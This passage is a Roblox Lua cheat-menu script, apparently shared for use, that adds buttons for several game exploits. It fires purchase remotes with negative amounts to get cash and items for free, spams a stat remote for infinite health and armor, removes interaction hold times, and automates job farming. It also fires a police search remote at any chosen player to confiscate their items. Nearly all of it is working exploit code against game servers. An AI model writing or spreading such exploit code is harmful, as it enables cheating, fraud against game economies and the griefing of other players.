dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("ScrollingFrame")
dropdownFrame.Size = UDim2.new(1, -20, 0, 100)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.ScrollBarThickness = 6
dropdownFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 25)
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 6)

local layout = Instance.new("UIListLayout", dropdownFrame)
layout.Padding = UDim.new(0, 2)

for _, gunName in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Text = gunName
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 13
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gunName
        dropdown.Text = gunName
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

--// Amount Input
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, 190)
amountBox.PlaceholderText = "Enter amount (3KTG CMD)"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.ClearTextOnFocus = false
amountBox.Text = "-100"
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Auto Give Toggle
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 230)
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.Text = "Start Auto Give"
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

--// Give Once Button
local giveOnce = Instance.new("TextButton")
giveOnce.Size = UDim2.new(1, -20, 0, 30)
giveOnce.Position = UDim2.new(0, 10, 0, 275)
giveOnce.Text = "Give Once"
giveOnce.BackgroundColor3 = Color3.fromRGB(255,255,255)
giveOnce.TextColor3 = Color3.new(0,0,0)
giveOnce.Font = Enum.Font.Gotham
giveOnce.TextSize = 14
giveOnce.Parent = frame
Instance.new("UICorner", giveOnce).CornerRadius = UDim.new(0, 6)

--// Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    toggle.BackgroundColor3 = giving and Color3.fromRGB(10, 10, 10) or Color3.fromRGB(0, 0, 0)

    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage:WaitForChild("PurchaseEvent"):FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

giveOnce.MouseButton1Click:Connect(function()
    if selectedGun and tonumber(amountBox.Text) then
        ReplicatedStorage:WaitForChild("PurchaseEvent"):FireServer(selectedGun, tonumber(amountBox.Text))
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO LIST (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "BAGONG BARYO"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "MCX", "AK-47", "MEDKIT", "Milk", "Tubigs"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["LATEST SCRIPT"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("INFINITE STATS DOMINION (MONSY)", function()
	local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Main Frame (ALL BLACK)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 180)
frame.Position = UDim2.new(0.5, -120, 0.5, -90)
frame.BackgroundColor3 = Color3.new(0, 0, 0) -- PURE BLACK
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

-- Title (WHITE TEXT)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "INFINITE STATS"
title.TextColor3 = Color3.new(0,0,0) -- WHITE
title.Font = Enum.Font.GothamBlack
title.TextSize = 20
title.Parent = frame

-- Toggle Function
local function createToggle(name, posY, statName)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 90, 0, 24)
    label.Position = UDim2.new(0, 16, 0, posY)
    label.BackgroundTransparency = 1
    label.Text = name
    label.TextColor3 = Color3.new(0,0,0) -- WHITE
    label.Font = Enum.Font.GothamBold
    label.TextSize = 15
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = frame

    local toggleFrame = Instance.new("Frame")
    toggleFrame.Size = UDim2.new(0, 56, 0, 28)
    toggleFrame.Position = UDim2.new(0, 168, 0, posY - 2)
    toggleFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1) -- DARK GRAY (OFF)
    toggleFrame.Parent = frame

    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 14)
    toggleCorner.Parent = toggleFrame

    local toggleButton = Instance.new("Frame")
    toggleButton.Size = UDim2.new(0, 24, 0, 24)
    toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
    toggleButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3) -- GRAY (OFF)
    toggleButton.Parent = toggleFrame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 12)
    btnCorner.Parent = toggleButton

    local enabled = false
    local connection

    toggleFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            enabled = not enabled

            if enabled then
                toggleButton.Position = UDim2.new(1, -28, 0.5, -12)
                toggleButton.BackgroundColor3 = Color3.new(0, 0.8, 0) -- GREEN (ON)
                toggleFrame.BackgroundColor3 = Color3.new(0, 0.2, 0) -- DARK GREEN
                label.TextColor3 = Color3.new(0, 1, 0) -- GREEN TEXT
            else
                toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
                toggleButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
                toggleFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
                label.TextColor3 = Color3.new(0,0,0) -- WHITE TEXT
            end

            if enabled then
                connection = RunService.Heartbeat:Connect(function()
                    if not enabled then return end
                    local args = { statName, Instance.new("Tool", nil) }
                    pcall(function()
                        game:GetService("ReplicatedStorage")
                            :WaitForChild("Aaron")
                            :WaitForChild("Remotes")
                            :WaitForChild("ModifyStatEvent")
                            :InvokeServer(unpack(args))
                    end)
                end)
            else
                if connection then connection:Disconnect() end
            end
        end
    end)
end

-- Create Toggles
createToggle("INFINITE HEALTH", 56, "Health")
createToggle("INFINITE ARMOR", 100, "Armor")

-- DRAGGABLE
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

RunService.RenderStepped:Connect(function()
    if dragging and dragInput then
        local delta = dragInput.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Close Button (BLACK BG, WHITE X)
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 28, 0, 28)
close.Position = UDim2.new(1, -36, 0, 8)
close.BackgroundColor3 = Color3.new(0, 0, 0) -- BLACK
close.BorderSizePixel = 1
close.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
close.Text = "X"
close.TextColor3 = Color3.new(0,0,0) -- WHITE
close.Font = Enum.Font.GothamBold
close.TextSize = 18
close.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = close

close.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("MANUAL COMSERVE DOMINION WAIT 4 SEC (MONSY)", function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Enable instant interact for all prompts
for _, prompt in ipairs(workspace:GetDescendants()) do
    if prompt:IsA("ProximityPrompt") then
        prompt.HoldDuration = 0 -- make it instant
    end
end

-- Also catch new prompts that appear later
workspace.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("ProximityPrompt") then
        descendant.HoldDuration = 0
    end
end)

-- Optional: Auto-activate if you press E once near something
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.E then
        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        for _, prompt in ipairs(workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") and prompt.Enabled then
                local dist = (prompt.Parent.Position - hrp.Position).Magnitude
                if dist < prompt.MaxActivationDistance then
                    fireproximityprompt(prompt)
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO CONFISCATE GUI (MONSY)", function()
	--// SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

--// REMOTE
local SearchRemote = ReplicatedStorage:WaitForChild("Police"):WaitForChild("Search")

--// MAIN GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "PoliceSearchGUI"

--// PLAYER LIST FRAME
local ListFrame = Instance.new("Frame")
ListFrame.Size = UDim2.new(0, 180, 0, 400)
ListFrame.Position = UDim2.new(0, 10, 0.5, -200)
ListFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
ListFrame.BorderSizePixel = 0
ListFrame.Parent = ScreenGui

Instance.new("UICorner", ListFrame).CornerRadius = UDim.new(0, 12)

local ListTitle = Instance.new("TextLabel")
ListTitle.Text = "PLAYERS ONLINE"
ListTitle.Font = Enum.Font.GothamBold
ListTitle.TextSize = 16
ListTitle.TextColor3 = Color3.fromRGB(0,0,0)
ListTitle.BackgroundTransparency = 1
ListTitle.Size = UDim2.new(1, 0, 0, 35)
ListTitle.Parent = ListFrame

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, -10, 1, -45)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.Parent = ListFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 4)
UIListLayout.Parent = ScrollingFrame

--// ADD PLAYER BUTTON
local playerButtons = {}

local function addPlayerToList(player)
	if playerButtons[player] then return end

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 35)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	btn.TextColor3 = Color3.fromRGB(0,0,0)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 14
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Parent = ScrollingFrame

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	local padding = Instance.new("UIPadding")
	padding.PaddingLeft = UDim.new(0, 10)
	padding.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if player.Character then
			SearchRemote:FireServer(player.Character)
		end
	end)

	playerButtons[player] = btn
end

local function removePlayerFromList(player)
	if playerButtons[player] then
		playerButtons[player]:Destroy()
		playerButtons[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	addPlayerToList(player)
end

Players.PlayerAdded:Connect(addPlayerToList)
Players.PlayerRemoving:Connect(removePlayerFromList)

print("MONSY")

--// 🔥 KEYBIND: PRESS P TO SHOW/HIDE
local open = true

UIS.InputBegan:Connect(function(key, typing)
	if typing then return end
	if key.KeyCode == Enum.KeyCode.P then
		open = not open
		ListFrame.Visible = open
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AFK COMSERV BETA TEST (MONSY)", function()
	local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GLOBALS
_G.WalkEnabled = false
_G.TriggerEnabled = false

-- GUI SETUP — PURE WHITE + BLACK TEXT
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "WalkTriggerGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 180)
frame.Position = UDim2.new(0.5, -120, 0.5, -90)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE NA
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "AUTO FARM"
title.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
title.Font = Enum.Font.GothamBlack
title.TextSize = 20
title.Parent = frame

-- TOGGLE FUNCTION (WHITE THEME)
local function createToggle(name, posY, toggleVar)
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(0, 90, 0, 24)
	label.Position = UDim2.new(0, 16, 0, posY)
	label.BackgroundTransparency = 1
	label.Text = name
	label.TextColor3 = Color3.new(0,0,0)            -- BLACK TEXT
	label.Font = Enum.Font.GothamBold
	label.TextSize = 15
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = frame

	local toggleFrame = Instance.new("Frame")
	toggleFrame.Size = UDim2.new(0, 56, 0, 28)
	toggleFrame.Position = UDim2.new(0, 168, 0, posY - 2)
	toggleFrame.BackgroundColor3 = Color3.fromRGB(230, 230, 230)  -- LIGHT GRAY OFF
	toggleFrame.Parent = frame

	local toggleCorner = Instance.new("UICorner")
	toggleCorner.CornerRadius = UDim.new(0, 14)
	toggleCorner.Parent = toggleFrame

	local toggleButton = Instance.new("Frame")
	toggleButton.Size = UDim2.new(0, 24, 0, 24)
	toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
	toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)           -- WHITE KNOB
	toggleButton.Parent = toggleFrame

	local btnCorner = Instance.new("UICorner")
	btnCorner.CornerRadius = UDim.new(0, 12)
	btnCorner.Parent = toggleButton

	local enabled = false

	toggleFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			enabled = not enabled
			_G[toggleVar] = enabled

			if enabled then
				toggleButton.Position = UDim2.new(1, -28, 0.5, -12)
				toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
				toggleFrame.BackgroundColor3 = Color3.fromRGB(100, 200, 100)  -- GREEN WHEN ON
				label.TextColor3 = Color3.fromRGB(0, 150, 0)
			else
				toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
				toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
				toggleFrame.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
				label.TextColor3 = Color3.new(0,0,0)
			end
		end
	end)
end

-- CREATE TOGGLES
createToggle("WALK", 56, "WalkEnabled")
createToggle("TRIGGER", 100, "TriggerEnabled")

-- DRAGGABLE (same)
local dragging, dragInput, dragStart, startPos = false

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- CLOSE BUTTON — WHITE + BLACK TEXT
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 28, 0, 28)
close.Position = UDim2.new(1, -36, 0, 8)
close.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE
close.BorderSizePixel = 1
close.BorderColor3 = Color3.new(0, 0, 0)            -- BLACK BORDER
close.Text = "X"
close.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
close.Font = Enum.Font.GothamBold
close.TextSize = 18
close.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = close

close.MouseButton1Click:Connect(function()
	_G.WalkEnabled = false
	_G.TriggerEnabled = false
	screenGui:Destroy()
end)

-- CHARACTER & PARTS (same na same)
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local hrp = character:WaitForChild("HumanoidRootPart")

player.CharacterAdded:Connect(function(newChar)
	character = newChar
	humanoid = newChar:WaitForChild("Humanoid")
	hrp = newChar:WaitForChild("HumanoidRootPart")
end)

local folder = workspace:WaitForChild("ComService"):WaitForChild("CleanFolder")
local parts = {
	folder:GetChildren()[1],
	folder:GetChildren()[2],
	folder:GetChildren()[3],
	folder:GetChildren()[4],
	folder:GetChildren()[5]
}

-- WALK LOOP (exact same)
task.spawn(function()
	while true do
		task.wait()
		if not _G.WalkEnabled then continue end
		if not character or not character.Parent then continue end

		for i = 1, #parts do
			if not _G.WalkEnabled then break end
			local part = parts[i]
			if part and part:IsA("BasePart") then
				humanoid:MoveTo(part.Position)
				local reached = humanoid.MoveToFinished:Wait()
				if reached then
					task.wait(6)
				end
			end
		end
	end
end)

-- TRIGGER LOOP (exact same)
task.spawn(function()
	while true do
		task.wait()
		if not _G.TriggerEnabled then continue end
		if not character or not character.Parent then continue end

		for i = 1, #parts do
			if not _G.TriggerEnabled then break end
			local part = parts[i]
			if part and part:IsA("BasePart") then
				humanoid:MoveTo(part.Position)
				humanoid.MoveToFinished:Wait()
				task.wait(0.2)

				local prompt = part:FindFirstChild("ProximityPrompt")
				if prompt then
					fireproximityprompt(prompt)
				end
				task.wait(6)
			end
		end
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX FARM UNIVERSAL (MONSY)", function()
	-- LocalScript in StarterPlayerScripts

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Main Frame — PURE WHITE
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 170)
frame.Position = UDim2.new(0.5, -120, 0.5, -85)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE NA
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "JOB BOX"
title.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Money Label
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.fromRGB(0, 170, 0)   -- GREEN PARA KITA PA RIN
moneyLabel.Font = Enum.Font.GothamBold
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- INSTANT Button — WHITE + BLACK TEXT
local instantButton = Instance.new("TextButton")
instantButton.Size = UDim2.new(0, 90, 0, 30)
instantButton.Position = UDim2.new(0, 10, 1, -68)
instantButton.BackgroundColor3 = Color3.new(1, 1, 1)    -- WHITE
instantButton.BorderSizePixel = 1
instantButton.BorderColor3 = Color3.new(0, 0, 0)        -- BLACK BORDER
instantButton.Text = "INSTANT"
instantButton.TextColor3 = Color3.new(0,0,0)            -- BLACK TEXT
instantButton.Font = Enum.Font.GothamBold
instantButton.TextSize = 14
instantButton.Parent = frame

local instBtnCorner = Instance.new("UICorner")
instBtnCorner.CornerRadius = UDim.new(0, 8)
instBtnCorner.Parent = instantButton

-- PICK UP Button — WHITE + BLACK TEXT
local pickUpButton = Instance.new("TextButton")
pickUpButton.Size = UDim2.new(0, 90, 0, 30)
pickUpButton.Position = UDim2.new(1, -100, 1, -68)
pickUpButton.BackgroundColor3 = Color3.new(1, 1, 1)     -- WHITE
pickUpButton.BorderSizePixel = 1
pickUpButton.BorderColor3 = Color3.new(0, 0, 0)         -- BLACK BORDER
pickUpButton.Text = "PICK UP"
pickUpButton.TextColor3 = Color3.new(0,0,0)             -- BLACK TEXT
pickUpButton.Font = Enum.Font.GothamBold
pickUpButton.TextSize = 14
pickUpButton.Parent = frame

local pickCorner = Instance.new("UICorner")
pickCorner.CornerRadius = UDim.new(0, 8)
pickCorner.Parent = pickUpButton

-- DROP Button — WHITE + BLACK TEXT
local dropButton = Instance.new("TextButton")
dropButton.Size = UDim2.new(0, 210, 0, 28)
dropButton.Position = UDim2.new(0.5, -105, 1, -35)
dropButton.BackgroundColor3 = Color3.new(1, 1, 1)       -- WHITE
dropButton.BorderSizePixel = 1
dropButton.BorderColor3 = Color3.new(0, 0, 0)           -- BLACK BORDER
dropButton.Text = "DROP"
dropButton.TextColor3 = Color3.new(0,0,0)               -- BLACK TEXT
dropButton.Font = Enum.Font.GothamBold
dropButton.TextSize = 14
dropButton.Parent = frame

local dropCorner = Instance.new("UICorner")
dropCorner.CornerRadius = UDim.new(0, 8)
dropCorner.Parent = dropButton

-- DRAGGING (same na same)
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
